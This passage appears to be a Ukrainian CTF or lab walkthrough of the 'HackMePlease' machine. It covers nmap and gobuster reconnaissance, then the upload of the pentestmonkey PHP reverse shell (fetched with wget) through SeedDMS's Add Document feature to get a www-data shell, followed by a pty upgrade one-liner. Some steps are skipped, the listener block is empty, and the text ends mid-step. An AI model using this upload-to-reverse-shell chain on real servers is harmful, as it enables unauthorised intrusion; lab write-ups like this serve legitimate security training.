### 2. Сканування **відкритих портів цільової машини**.


Можна зробити різними шляхами, наприклад:

```sh
nmap -sC -sV -p- -oN tcp_scan 10.0.2.17
```

Команда, яку варто детально розбирати на практиці:

**Загальне призначення**
Команда виконує:
✅ повне TCP-сканування всіх 65 535 портів
✅ визначення версій сервісів
✅ запуск стандартних NSE-скриптів
✅ збереження результатів у файл

Тобто це повноцінне первинне технічне розвідування цілі.

**Розбір кожного параметра**
*nmap*

У пентесті це перший етап Discovery / Enumeration.

*-sC* — Default Scripts Scan
🔹 Що означає:
Запускає стандартний набір NSE-скриптів (--script=default).
Це автоматизовані перевірки:
- банерів сервісів;
- анонімного доступу;
- простих вразливостей;
- SSL-сертифікатів;
- SMB, FTP, HTTP базових перевірок.

**Приклади:**

- http-title
- ftp-anon
- ssh-hostkey
- smb-os-discovery

**Навіщо:**
Швидко отримати максимум інформації без ручного аналізу.

**Ризики:**

- може бути помітно в логах;
- деякі скрипти «агресивні».

*-sV* — Service Version Detection
🔹 Що означає:
Визначає:

- який сервіс працює на порті;
- точну версію ПЗ;
- іноді ОС та бібліотеки.

**Приклад:**
```sh
80/tcp open  http    Apache httpd 2.4.41
3306/tcp open mysql   MySQL 5.7.29
```
**Навіщо:**
Версії → пошук експлойтів → Exploit-DB, CVE.

*-p-* — Scan All Ports
🔹 Що означає:
Сканує всі 65 535 TCP-портів, бо за замовчуванням Nmap сканує лише топ-1000 популярних портів.

**Приклад:**

- без *-p-*  можна пропустити нестандартний сервіс;
- з *-p-*  знайдеш бекдор, кастомні сервіси, CTF-пастки.

⚠️ Мінус:

- довше;
- гучніше для IDS/IPS.

*-oN tcp_scan* — Output Normal
🔹 Що означає:
Зберігає результат у файл у звичайному текстовому форматі.

**Навіщо:**

- зберігати лог;
- прикладати до звіту;
- аналізувати пізніше.


Отримуємо наступне:
![приклад використання nmap](./HackMePlease/image-1.png)

Таким чином, в нас є інформація для подальшого дослідження вебвервісу та сервісу БД.


### 3. Дослідження вебсервера

У браузері відкриваємо http://10.0.2.17,  отримуємо:
![main_page](./HackMePlease/image-2.png)

Передивляємось, з чим маємо справу, виявляється, що це фрішна тулза для менеджерів проєктів.

Виявляємо доступні директорії:

**Детальний розбір команди**
```sh
gobuster dir -u http://10.0.2.17 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
```

Ця команда виконує брутфорс-перелік (enumeration) директорій і файлів на вебсервері.
**Мета:** знайти приховані URL-шляхи, файли, адмін-панелі, резервні копії, конфіги, аплоади тощо.

1. gobuster

Gobuster — це високошвидкісний інструмент для:

brute-force пошуку:
директорій,
файлів,
DNS-субдоменів,
vhost.

Він працює за принципом:

бере слово зі словника → підставляє в URL → відправляє HTTP-запит → аналізує відповідь сервера.

2. dir — режим роботи
gobuster dir

Означає використовувати режим directory / file brute forcing.

Gobuster має й інші режими:

dns — пошук субдоменів
vhost — virtual hosts
fuzz — fuzzing параметрів

У CTF і веб-пентесті найчастіше використовують саме dir.

3. **-u http://10.0.2.17**

Це цільовий URL, куди Gobuster відправляє запити.
Фактично він генерує:
```
http://10.0.2.17/admin
http://10.0.2.17/login
http://10.0.2.17/uploads
...
```

***Важливо** обовʼязково вказувати протокол (http:// або https://)
якщо сайт працює на нестандартному порту:

http://10.0.2.17:8080

4. -w — словник
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


Це файл зі списком слів (wordlist).

Приклад вмісту:
```
admin
backup
uploads
secret
test
old
api
dev
```

Gobuster по черзі підставляє кожне слово в URL.

**Чому саме "medium"?**

У Kali є три типи:

Wordlist	Розмір	Швидкість	Повнота
small	   ~10k	     швидко	     мало
medium	   ~220k	 баланс	  оптимально
large	~1M	        повільно	максимум

Для лабораторій і CTF — medium ідеальний.

5. -x php,html,txt,zip — розширення файлів
```
-x php,html,txt,zip
```
Означає додатково перевіряти файли з цими розширеннями.

Gobuster буде генерувати:
```
admin
admin.php
admin.html
admin.txt
admin.zip

backup
backup.php
backup.html
backup.txt
backup.zip
```
**Навіщо це потрібно?**

Бо сервер може не показувати каталог,
але файл може існувати:

backup.zip
config.php
db.txt

Це часто приводить до:

витоку конфігів,
паролів,
дампів БД,
резервних копій.

6. Як виглядає процес реально

Gobuster робить приблизно так:

GET /admin        → 404
GET /admin.php    → 200 ✅
GET /backup.zip   → 200 ✅
GET /test         → 403


І виводить тільки цікаві відповіді:

/admin.php (Status: 200)
/backup.zip (Status: 200)

7. Типові HTTP-коди у результатах
Код	Значення	Що означає
200	OK	Файл/директорія існує
301 / 302	Redirect	Можлива реальна сторінка
403	Forbidden	Існує, але доступ заборонений
404	Not Found	Не існує
403 — часто дуже цінний результат.

8. Типові помилки 

❌ Забули -x

- знаходять тільки каталоги, але не файли.

❌ Використали занадто великий словник
- сканування триває годинами.

❌ Не врахували нестандартний порт
- http://10.0.2.17:8080

❌ Сервер повертає fake 200
Деякі сайти на всі запити повертають 200.
Треба використовувати:
**--exclude-length**



За декілька хвилин отримуємо наступний результат:

![gobuster_results](./HackMePlease/image-3.png)

Існує декілька варіантів для подальших досліджень, то почнемо.

##  Крок 4: Експлуатація Remote Command Execution

Після успішної автентифікації повертаємось до знайденого експлойту.
Використовуючи авторизовану сесію, було завантажено **PHP reverse shell**.

### Кроки:

1. Завантаження реверс-шеллу:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
![php-1](./HackMePlease/image-17.png)

2. Модифікація параметрів `$ip` та `$port` відповідно до машини атакуючого.

![kali-ip](./HackMePlease/image-18.png)


3. Завантаження файлу через розділ **Add Document** у SeedDMS.

![addDoc](./HackMePlease/image-19.png)

4. Після завантаження, навівши курсор на файл, у нижньому лівому куті браузера видно шлях до файлу.
   З цього посилання визначається **ID документа** (у нашому випадку  `4`).
   **http://10.0.2.17/seeddms51x/seeddms-5.1.22/out/out.ViewDocument.php?documentid=4&showtree=1**
![added](./HackMePlease/image-20.png)

5. Запуск **nc** та слухаємо порт **3421**:

```bash

```

6. Виконання шеллу:

```
http://10.0.2.17/seeddms51x/data/1048576/9/1.php
```
![Offset](./HackMePlease/image-22.png)
Чому номер блоку саме **1048576**
- Це вже внутрішній параметр SeedDMS.
- SeedDMS зберігає файли в каталогах, розбитих за розміром блоку зберігання.

**Каталог 1048576** — це логічний зсув директорій (contentOffsetDir), який SeedDMS використовує для побудови внутрішньої структури зберігання файлів.
Він не пов'язаний із розміром файлів або блоків пам’яті.
Значення задається в конфігурації і використовується як стартова директорія.

Цей параметр:
- задається в конфігурації (settings.xml);
- рідко змінюється;
- практично завжди дорівнює *1048576*.

[Посилання на офіційну документацію:](https://sourceforge.net/p/seeddms/code/ci/seeddms-5.1.x/tree/conf/settings.xml.template)

![tblDocuments](./HackMePlease/image-21.png)

7. Отримано shell з обмеженими правами користувача **www-data**.
![www-data](./HackMePlease/image-23.png)

> ⚠️ Отриманий shell нестабільний. Для покращення інтерактивності рекомендується оновити його до повноцінного терміналу.
```sh
python -c "import pty; pty.spawn('/bin/bash')"
```
Немає пайтона :-), користуємось тим, що є:
